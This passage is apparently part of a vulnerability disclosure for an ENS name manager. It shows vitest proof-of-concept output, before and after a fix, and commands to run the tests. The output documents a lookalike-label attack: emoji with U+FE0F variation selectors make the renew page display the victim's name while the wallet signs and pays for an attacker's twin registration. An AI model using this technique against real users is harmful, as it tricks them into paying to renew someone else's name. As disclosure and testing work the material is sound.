  URL segment            : "🔥️🔥️🔥️.eth"
  v2 expiry asked for    : ["🔥🔥🔥.eth"]
  v2 owner asked for     : ["🔥🔥🔥.eth"]
  label returned         : "🔥️🔥️🔥️"
  currentExpiry returned : 1791939019 (victim 1791939019, attacker 1815267019)

stdout | src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew-v1/$name (v1, unmigrated) > gates on the attacker label being renewable while showing the victim expiry
/renew-v1/$name loader
  URL segment            : "🔥️🔥️🔥️.eth"
  owner asked for (v2,v1): ["🔥🔥🔥.eth"] ["🔥🔥🔥.eth"]
  v1 expiry asked for    : ["🔥🔥🔥.eth"]
  isRenewable asked for  : ["🔥️🔥️🔥️"]
  label returned         : "🔥️🔥️🔥️"
  currentExpiry returned : 1791939019 (victim 1791939019)

 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew/$name (v2) > reads the expiry on the canonical name and returns the raw label to the page 5ms
 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew/$name (v2) > control: the canonical URL reads and renews one name 1ms
 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew-v1/$name (v1, unmigrated) > gates on the attacker label being renewable while showing the victim expiry 2ms
 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew-v1/$name (v1, unmigrated) > control: the canonical URL is gated and renewed on one name 1ms
 × src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > with the label canonicalised in parseRenewableName (counterfactual, expected to FAIL on the frozen snapshot) > the label the page renews is the label whose expiry it shows 5ms
   → expected '🔥️🔥️🔥️' to be '🔥🔥🔥' // Object.is equality
stdout | src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew/$name (v2): what the page shows and what it asks the wallet to sign > renders the victim name, prices and signs for the attacker label, and reports the victim name extended
/renew/$name page
  URL segment              : "🔥️🔥️🔥️.eth"
  expiry read asked for    : ["🔥🔥🔥.eth"]
  <h1> rendered            : "🔥️🔥️🔥️.eth"
  <h1> under ENSIP-15      : "🔥🔥🔥.eth"
  price read asked for     : ["🔥️🔥️🔥️"]
  price quoted (USDC units): 5000000 (victim label 640000000, attacker label 5000000)
  renew() label in calldata: "🔥️🔥️🔥️"
  renew() duration         : 31557600
  transaction to           : 0xa88553F454b77203B0D036A05c894d555EAAa2Cc
  transaction description  : "Renew 🔥️🔥️🔥️.eth"
  labelhash(calldata label): 0x0723b89521a1eb8c9e72fcd1194f6cf222364aca319c226ae79fafe10a9e5f2c
  labelhash(victim label)  : 0x4fcdcd9b2aeda84409e4e1a1b25af4129e9ba9a5beb49cab0a7b68bf1dc2a734
  panel card, pending      : "🔥️🔥️🔥️.eth"
  panel Expires, pending   : "October 14, 2027"
  panel card, success      : "🔥️🔥️🔥️.eth"
  panel Expires, success   : "October 14, 2027"
  victim expiry + duration : "October 14, 2027"
  attacker expiry+duration : "July 10, 2028"

stdout | src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew-v1/$name (v1, unmigrated): the same page, the v1 renewer > signs renew(attackerLabel, ...) on ETHRenewerV1 while showing the victim expiry
/renew-v1/$name page
  URL segment              : "🔥️🔥️🔥️.eth"
  v1 expiry read asked for : ["🔥🔥🔥.eth"]
  isRenewable asked for    : ["🔥️🔥️🔥️"]
  <h1> rendered            : "🔥️🔥️🔥️.eth"
  renew() label in calldata: "🔥️🔥️🔥️"
  transaction to           : 0x4ad56feb5Fc7B8298db06E88fd5CBc41D64602Fa
  panel card, success      : "🔥️🔥️🔥️.eth"
  panel Expires, success   : "October 14, 2027"

 ✓ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew/$name (v2): what the page shows and what it asks the wallet to sign > renders the victim name, prices and signs for the attacker label, and reports the victim name extended 291ms
 ✓ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew/$name (v2): what the page shows and what it asks the wallet to sign > control: the canonical URL shows, prices, signs and reports one name 31ms
 ✓ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew-v1/$name (v1, unmigrated): the same page, the v1 renewer > signs renew(attackerLabel, ...) on ETHRenewerV1 while showing the victim expiry 30ms
 × src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > with the label canonicalised in parseRenewableName (counterfactual, expected to FAIL on the frozen snapshot) > the label the wallet signs is the label whose expiry the page shows 36ms
   → expected '🔥️🔥️🔥️' to be '🔥🔥🔥' // Object.is equality

⎯⎯⎯⎯⎯⎯⎯ Failed Tests 2 ⎯⎯⎯⎯⎯⎯⎯

 FAIL  src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > with the label canonicalised in parseRenewableName (counterfactual, expected to FAIL on the frozen snapshot) > the label the wallet signs is the label whose expiry the page shows
AssertionError: expected '🔥️🔥️🔥️' to be '🔥🔥🔥' // Object.is equality

Expected: "🔥🔥🔥"
Received: "🔥️🔥️🔥️"

 ❯ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx:614:23
    612|     await renewThrough(RenewRoute, 'v2', world.TWIN)
    613|     const w = walletCall()
    614|     expect(w.args[0]).toBe(world.CANONICAL_LABEL)
       |                       ^
    615|   })
    616| })

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[1/2]⎯

 FAIL  src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > with the label canonicalised in parseRenewableName (counterfactual, expected to FAIL on the frozen snapshot) > the label the page renews is the label whose expiry it shows
AssertionError: expected '🔥️🔥️🔥️' to be '🔥🔥🔥' // Object.is equality

Expected: "🔥🔥🔥"
Received: "🔥️🔥️🔥️"

 ❯ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts:291:24
    289|   it('the label the page renews is the label whose expiry it shows', a…
    290|     const data = await runLoader(RenewRoute, world.TWIN)
    291|     expect(data.label).toBe(world.CANONICAL_LABEL)
       |                        ^
    292|   })
    293| })

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[2/2]⎯


 Test Files  2 failed (2)
      Tests  2 failed | 8 passed (10)
   Start at  00:50:18
   Duration  3.99s (transform 998ms, setup 0ms, import 5.43s, tests 583ms, environment 399ms)

vitest exit code, arm 1: 1
=== APPLY FIX PATCH (overlay only) ===
patching file apps/manager/src/features/renew/utils/renewableName.ts
c2860ba2117053fe6e916a2d437834a333f50874c4558f7b191c4a82b8aa65d5  apps/manager/src/features/renew/utils/renewableName.ts
=== ARM 2: PATCHED (expected: file 1 -> 3 failed 3 passed, file 2 -> 2 failed 2 passed; the failures are the defect tests, at their first label assertion) ===

 RUN  v4.1.5 <archive-root>/apps/manager

stdout | src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > one URL segment, two canonical forms > parseName keeps U+FE0F, ENSIP-15 strips it, and the two labels are two registrations
canonicalisers
  URL segment                 : "🔥️🔥️🔥️.eth"
  parseName label (renewed)   : "🔥🔥🔥"
  normalize name (shown/gated): "🔥🔥🔥.eth"
  labelhash(parseName label)  : 0x4fcdcd9b2aeda84409e4e1a1b25af4129e9ba9a5beb49cab0a7b68bf1dc2a734
  labelhash(canonical label)  : 0x4fcdcd9b2aeda84409e4e1a1b25af4129e9ba9a5beb49cab0a7b68bf1dc2a734

stdout | src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew/$name (v2) > reads the expiry on the canonical name and returns the raw label to the page
/renew/$name loader
  URL segment            : "🔥️🔥️🔥️.eth"
  v2 expiry asked for    : ["🔥🔥🔥.eth"]
  v2 owner asked for     : ["🔥🔥🔥.eth"]
  label returned         : "🔥🔥🔥"
  currentExpiry returned : 1791939023 (victim 1791939023, attacker 1815267023)

stdout | src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew-v1/$name (v1, unmigrated) > gates on the attacker label being renewable while showing the victim expiry
/renew-v1/$name loader
  URL segment            : "🔥️🔥️🔥️.eth"
  owner asked for (v2,v1): ["🔥🔥🔥.eth"] ["🔥🔥🔥.eth"]
  v1 expiry asked for    : ["🔥🔥🔥.eth"]
  isRenewable asked for  : ["🔥🔥🔥"]
  label returned         : "🔥🔥🔥"
  currentExpiry returned : 1791939023 (victim 1791939023)

 × src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > one URL segment, two canonical forms > parseName keeps U+FE0F, ENSIP-15 strips it, and the two labels are two registrations 202ms
   → expected '🔥🔥🔥' to be '🔥️🔥️🔥️' // Object.is equality
 × src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew/$name (v2) > reads the expiry on the canonical name and returns the raw label to the page 5ms
   → expected '🔥🔥🔥' to be '🔥️🔥️🔥️' // Object.is equality
 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew/$name (v2) > control: the canonical URL reads and renews one name 2ms
 × src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew-v1/$name (v1, unmigrated) > gates on the attacker label being renewable while showing the victim expiry 8ms
   → expected [ '🔥🔥🔥' ] to deeply equal [ '🔥️🔥️🔥️' ]
 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew-v1/$name (v1, unmigrated) > control: the canonical URL is gated and renewed on one name 1ms
 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > with the label canonicalised in parseRenewableName (counterfactual, expected to FAIL on the frozen snapshot) > the label the page renews is the label whose expiry it shows 2ms
stdout | src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew/$name (v2): what the page shows and what it asks the wallet to sign > renders the victim name, prices and signs for the attacker label, and reports the victim name extended
/renew/$name page
  URL segment              : "🔥️🔥️🔥️.eth"
  expiry read asked for    : ["🔥🔥🔥.eth"]
  <h1> rendered            : "🔥🔥🔥.eth"
  <h1> under ENSIP-15      : "🔥🔥🔥.eth"
  price read asked for     : ["🔥🔥🔥"]
  price quoted (USDC units): 640000000 (victim label 640000000, attacker label 5000000)
  renew() label in calldata: "🔥🔥🔥"
  renew() duration         : 31557600
  transaction to           : 0xa88553F454b77203B0D036A05c894d555EAAa2Cc
  transaction description  : "Renew 🔥🔥🔥.eth"
  labelhash(calldata label): 0x4fcdcd9b2aeda84409e4e1a1b25af4129e9ba9a5beb49cab0a7b68bf1dc2a734
  labelhash(victim label)  : 0x4fcdcd9b2aeda84409e4e1a1b25af4129e9ba9a5beb49cab0a7b68bf1dc2a734
  panel card, pending      : "🔥🔥🔥.eth"
  panel Expires, pending   : "October 14, 2027"
  panel card, success      : "🔥🔥🔥.eth"
  panel Expires, success   : "October 14, 2027"
  victim expiry + duration : "October 14, 2027"
  attacker expiry+duration : "July 10, 2028"

stdout | src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew-v1/$name (v1, unmigrated): the same page, the v1 renewer > signs renew(attackerLabel, ...) on ETHRenewerV1 while showing the victim expiry
/renew-v1/$name page
  URL segment              : "🔥️🔥️🔥️.eth"
  v1 expiry read asked for : ["🔥🔥🔥.eth"]
  isRenewable asked for    : ["🔥🔥🔥"]
  <h1> rendered            : "🔥🔥🔥.eth"
  renew() label in calldata: "🔥🔥🔥"
  transaction to           : 0x4ad56feb5Fc7B8298db06E88fd5CBc41D64602Fa
  panel card, success      : "🔥🔥🔥.eth"
  panel Expires, success   : "October 14, 2027"

 × src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew/$name (v2): what the page shows and what it asks the wallet to sign > renders the victim name, prices and signs for the attacker label, and reports the victim name extended 228ms
   → expected '🔥🔥🔥.eth' to be '🔥️🔥️🔥️.eth' // Object.is equality
 ✓ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew/$name (v2): what the page shows and what it asks the wallet to sign > control: the canonical URL shows, prices, signs and reports one name 29ms
 × src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew-v1/$name (v1, unmigrated): the same page, the v1 renewer > signs renew(attackerLabel, ...) on ETHRenewerV1 while showing the victim expiry 34ms
   → expected [ '🔥🔥🔥' ] to deeply equal [ '🔥️🔥️🔥️' ]
 ✓ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > with the label canonicalised in parseRenewableName (counterfactual, expected to FAIL on the frozen snapshot) > the label the wallet signs is the label whose expiry the page shows 28ms

⎯⎯⎯⎯⎯⎯⎯ Failed Tests 5 ⎯⎯⎯⎯⎯⎯⎯

 FAIL  src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew/$name (v2): what the page shows and what it asks the wallet to sign > renders the victim name, prices and signs for the attacker label, and reports the victim name extended
AssertionError: expected '🔥🔥🔥.eth' to be '🔥️🔥️🔥️.eth' // Object.is equality

Expected: "🔥️🔥️🔥️.eth"
Received: "🔥🔥🔥.eth"

 ❯ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx:513:27
    511|     // The heading is the attacker's label, and under the name system'…
    512|     // equivalence it reads as the victim's name.
    513|     expect(r.headingText).toBe(`${world.TWIN_LABEL}.eth`)
       |                           ^
    514|     expect(r.headingText).not.toBe(world.CANONICAL)
    515|     expect(normalize(r.headingText)).toBe(world.CANONICAL)

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[1/5]⎯

 FAIL  src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx > /renew-v1/$name (v1, unmigrated): the same page, the v1 renewer > signs renew(attackerLabel, ...) on ETHRenewerV1 while showing the victim expiry
AssertionError: expected [ '🔥🔥🔥' ] to deeply equal [ '🔥️🔥️🔥️' ]

- Expected
+ Received

  [
-   "🔥️🔥️🔥️",
+   "🔥🔥🔥",
  ]

 ❯ src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx:595:37
    593|
    594|     expect(world.asked.expiryV1).toEqual([world.CANONICAL])
    595|     expect(world.asked.isRenewable).toEqual([world.TWIN_LABEL])
       |                                     ^
    596|     expect(r.data.currentExpiry).toBe(world.VICTIM_EXPIRY)
    597|     expect(r.headingText).toBe(`${world.TWIN_LABEL}.eth`)

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[2/5]⎯

 FAIL  src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > one URL segment, two canonical forms > parseName keeps U+FE0F, ENSIP-15 strips it, and the two labels are two registrations
AssertionError: expected '🔥🔥🔥' to be '🔥️🔥️🔥️' // Object.is equality

Expected: "🔥️🔥️🔥️"
Received: "🔥🔥🔥"

 ❯ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts:217:26
    215|
    216|     expect(normalize(world.TWIN)).toBe(world.CANONICAL)
    217|     expect(parsed.label).toBe(world.TWIN_LABEL)
       |                          ^
    218|     expect(canonical?.label).toBe(world.CANONICAL_LABEL)
    219|     expect(parsed.label).not.toBe(canonical?.label)

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[3/5]⎯

 FAIL  src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew/$name (v2) > reads the expiry on the canonical name and returns the raw label to the page
AssertionError: expected '🔥🔥🔥' to be '🔥️🔥️🔥️' // Object.is equality

Expected: "🔥️🔥️🔥️"
Received: "🔥🔥🔥"

 ❯ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts:243:24
    241|     expect(data.currentExpiry).toBe(world.VICTIM_EXPIRY)
    242|     // Label (what the page renews): the attacker's registration.
    243|     expect(data.label).toBe(world.TWIN_LABEL)
       |                        ^
    244|     expect(world.registrations.get(`${data.label}.eth`)?.owner).toBe(w…
    245|     // And the calldata built from it is not the canonical name's call…

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[4/5]⎯

 FAIL  src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew-v1/$name (v1, unmigrated) > gates on the attacker label being renewable while showing the victim expiry
AssertionError: expected [ '🔥🔥🔥' ] to deeply equal [ '🔥️🔥️🔥️' ]

- Expected
+ Received

  [
-   "🔥️🔥️🔥️",
+   "🔥🔥🔥",
  ]

 ❯ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts:274:37
    272|     expect(world.asked.ownerV1).toEqual([world.CANONICAL])
    273|     expect(world.asked.expiryV1).toEqual([world.CANONICAL])
    274|     expect(world.asked.isRenewable).toEqual([world.TWIN_LABEL])
       |                                     ^
    275|     expect(data.currentExpiry).toBe(world.VICTIM_EXPIRY)
    276|     expect(data.label).toBe(world.TWIN_LABEL)

⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[5/5]⎯


 Test Files  2 failed (2)
      Tests  5 failed | 5 passed (10)
   Start at  00:50:23
   Duration  3.61s (transform 1.05s, setup 0ms, import 4.91s, tests 542ms, environment 508ms)

vitest exit code, arm 2: 1
both arms ran; exit codes are expected to be nonzero (each arm has tests designed to fail)
=== POST-RUN: frozen snapshot untouched? ===
clean: renewableName.ts in the snapshot is unpatched
clean: no PoC file in the snapshot
script exit: 0
```

### Placing the files, and running them

```bash
# once, at the repo root, before going offline
pnpm install --frozen-lockfile

cp renew_route_two_canonical_forms.poc.test.ts apps/manager/src/routes/renew/
cp renew_page_shows_one_name_signs_another.poc.test.tsx apps/manager/src/routes/renew/

cd apps/manager
./node_modules/.bin/vitest run \
  src/routes/renew/renew_route_two_canonical_forms.poc.test.ts \
  src/routes/renew/renew_page_shows_one_name_signs_another.poc.test.tsx --reporter=verbose
```

The `report(...)` blocks print, per file, the URL segment, the name each read was asked for, the label and expiry returned, the rendered heading and its ENSIP-15 form, the label the price was quoted for, the decoded `renew` calldata and its target, and the name and "Expires" line on the panel. Those lines are the measurement; the assertions are the claim.
